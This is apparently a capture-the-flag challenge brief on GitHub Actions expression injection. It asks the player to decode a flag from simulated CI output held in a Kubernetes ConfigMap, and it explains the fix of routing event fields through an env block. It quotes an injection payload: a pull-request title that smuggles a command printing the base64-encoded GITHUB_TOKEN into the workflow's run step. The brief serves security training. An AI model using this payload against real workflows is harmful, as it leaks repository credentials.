# CI Injection — GitHub Actions Expression Injection

A pull request was opened against this project. The workflow ran. And then the CI output contained something it definitely should not have.

This challenge simulates what happens when a GitHub Actions workflow uses `${{ github.event.pull_request.title }}` directly in a `run:` step — and an attacker submits a PR with a weaponized title.

You can't run real GitHub Actions here, so we've pre-computed the attack output and stored it in a ConfigMap. Your job is to find and decode the flag that the attacker extracted from the simulated CI environment.

## What Happened

An attacker opened a PR with this title:

```
"; printf '%s' $GITHUB_TOKEN | base64; echo "DONE
```

The workflow step was:

```yaml
- name: Print PR info
  run: echo "PR title: ${{ github.event.pull_request.title }}"
```

After expression expansion, the runner executed:

```bash
echo "PR title: "; printf '%s' $GITHUB_TOKEN | base64; echo "DONE"
```

This printed the base64-encoded `GITHUB_TOKEN` to the CI log. The flag is embedded in that simulated output.

## Mission

1. Read the simulated CI output in ConfigMap `ci-output` in namespace `dojo-sec-ci`
2. Decode the base64-encoded "token" in the output
3. The flag is embedded in the decoded content

## Why This Matters

This is one of the most common vulnerabilities in real GitHub Actions workflows. It has been exploited at:
- PyPI (Python Package Index)
- Homebrew
- Multiple major open-source projects

The attacker doesn't need any special permissions — they just need to open a PR. The fix is always the same: never put `${{ github.event.* }}` directly in a `run:` step — always go through an `env:` block.

## Rules of Engagement

- Namespace: `dojo-sec-ci`
- ConfigMap: `kubectl get configmap ci-output -n dojo-sec-ci -o jsonpath='{.data.output}'`
- Find the base64 blob in the output, decode it, extract the flag
- Flag format: `KUBE{...}`
